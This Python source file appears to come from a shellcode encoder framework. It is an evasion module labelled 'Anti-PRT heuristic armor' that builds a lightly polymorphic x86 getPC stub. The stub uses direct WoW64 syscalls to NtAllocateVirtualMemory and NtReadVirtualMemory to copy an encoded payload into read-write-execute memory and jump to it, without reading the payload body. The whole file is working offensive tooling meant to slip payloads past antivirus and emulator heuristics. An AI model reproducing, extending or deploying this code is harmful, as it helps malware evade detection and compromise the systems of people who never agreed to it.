#!/usr/bin/python

"""
Anti-PRT heuristic armor using SYSCALL-based code relocation
For evasion of PRT heuristic
"""

from struct import unpack, pack
from random import choice

from utils.rand import rand_bytes, rand_word_key_pair
from utils.bytework import bytes_to_asm
from arch.core import arch_registers, stackpointer_registers, word_keywords, acc_regs, ctr_regs, data_regs, bit_packs
from arch.winapi import syscall_db, page_read_write_execute, mem_commit

from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module

class evasion_prt_relocator(evasion_module):

    #
    # Lightly-polymorphic getPC stub to relocate payload to virtual memory using syscall to prevent triggering PRT heuristic (since we don't perform read instructions on payload body)
    #
    # [-] Limitations:
    #      - Currently only works on WoW64 systems
    #
    # [*] Todo:
    #      - This can be further improved by supporting more platforms (eg do_syscall is WoW64 specific only stub now)
	#      - more alternatives (eg. ret, call, etc.) for jmp getpc_reg
	#      - avoid getpc seeding instruction at the end
    #
	def getpc_stub(self, getpc_reg):

		payload_size = len(self.encoded_payload) + len(self.keyfiller_stub) + len(self.decoder_stub)

		# registry size
		reg_size = 2**self.bits
		word_size = self.bits / 8

		syscalldb = syscall_db(self.additional_params['os_version'], self.additional_params['service_pack'])
		syscalldb.connect(self.additional_params['db_filename'])

		NtAllocateVirtualMemory = syscalldb.get_syscall_number("NtAllocateVirtualMemory")
		NtReadVirtualMemory = syscalldb.get_syscall_number("NtReadVirtualMemory")

		regs = arch_registers(self.arch, self.bits)

		acc_reg = acc_regs[self.bits]
		ctr_reg = ctr_regs[self.bits]
		data_reg = data_regs[self.bits]
		stackpointer_reg = stackpointer_registers[self.bits]

		word_keyword = word_keywords[self.bits]

		# null instruction
		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		# Blacklist to prevent syscall-related register clobbering
		blacklist = [acc_reg, ctr_reg, data_reg]

		reg1 = regs.random_gp_reg(False, blacklist)

		# No reuse of reg1
		blacklist += [reg1]

		ptr_reg = regs.random_gp_reg(False, blacklist)

		reg2 = regs.random_gp_reg(False, blacklist)

		# No reuse of reg2
		blacklist += [reg2]

		reg3 = regs.random_gp_reg(False, blacklist)

		# No reuse of reg3
		blacklist += [reg3]

		# CALL DWORD PTR [FS:ptr_reg]
		call_instr = bytes_to_asm("\x64\xFF" + chr(0x10 | regs.gp_reg_to_opcode_index(ptr_reg)))

		variables = {'word_size': word_size, 'call_instr': call_instr, 'getpc_reg': getpc_reg, 'acc_reg': acc_reg, 'ctr_reg': ctr_reg, 'data_reg': data_reg, 'stackpointer_reg': stackpointer_reg, 'word_keyword': word_keyword, 'null_instr': null_instr, 'ptr_reg': ptr_reg, 'reg1': reg1, 'reg2': reg2, 'reg3': reg3, 'page_read_write_execute': page_read_write_execute, 'mem_commit': mem_commit, 'reg_size': reg_size, 'NtAllocateVirtualMemory': NtAllocateVirtualMemory, 'NtReadVirtualMemory': NtReadVirtualMemory, 'payload_size': payload_size}

		# Assemble this seperately because MIASM reorders code which introduces null-bytes in JMP instruction
		listing_0 = '''
main:
	XOR {ctr_reg}, {ctr_reg}
	LEA {data_reg}, {word_keyword} PTR [{stackpointer_reg} + 4]
	{null_instr} {ptr_reg}, {ptr_reg}
	SUB {ptr_reg}, (-0xC0 % {reg_size})
	
	{call_instr}
	RET'''

		asm = assembler(self.arch, self.bits)
		syscall_stub = asm.assemble(listing_0.format(**variables))

		variables['syscall_stub'] = bytes_to_asm(syscall_stub)
		variables['start_jump'] = '0x{:02x}'.format(len(syscall_stub))


		listing_1 = '''
main:
	.byte 0xEB
	.byte {start_jump}

do_syscall:
	{syscall_stub}

start_relocator:
	SUB {stackpointer_reg}, ({word_size} * 2)
	MOV {reg1}, {stackpointer_reg}
	
	{null_instr} {reg2}, {reg2}
	SUB {reg2}, (-{payload_size} % {reg_size})
	
	MOV {word_keyword} PTR [{reg1}], {reg2}
	{null_instr} {reg3}, {reg3}

	MOV {word_keyword} PTR [{reg1} + 4], {reg3}
	
	SUB {reg3}, (-{page_read_write_execute} % {reg_size})
	PUSH {reg3}

	SUB {reg3}, (-({mem_commit} - {page_read_write_execute}) % {reg_size})
	PUSH {reg3}

	PUSH {reg1}

	{null_instr} {reg3}, {reg3}
	PUSH {reg3}

	SUB {reg1}, (-4 % {reg_size})
	PUSH {reg1}

	PUSH (-1 % {reg_size})

	{null_instr} {acc_reg}, {acc_reg}
	ADD {acc_reg}, {NtAllocateVirtualMemory}

	CALL do_syscall

	PUSH {acc_reg}

	{null_instr} {reg2}, {reg2}
	SUB {reg2}, (-{payload_size} % {reg_size})
	PUSH {reg2}

	PUSH {word_keyword} PTR [{reg1}]
	JMP docall
callback:
	PUSH (-1 % {reg_size})

	{null_instr} {acc_reg}, {acc_reg}
	ADD {acc_reg}, {NtReadVirtualMemory}

	CALL do_syscall

	MOV {getpc_reg}, {word_keyword} PTR [{reg1}]
	JMP {getpc_reg}
docall:
	CALL callback
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing_1.format(**variables))
		return stub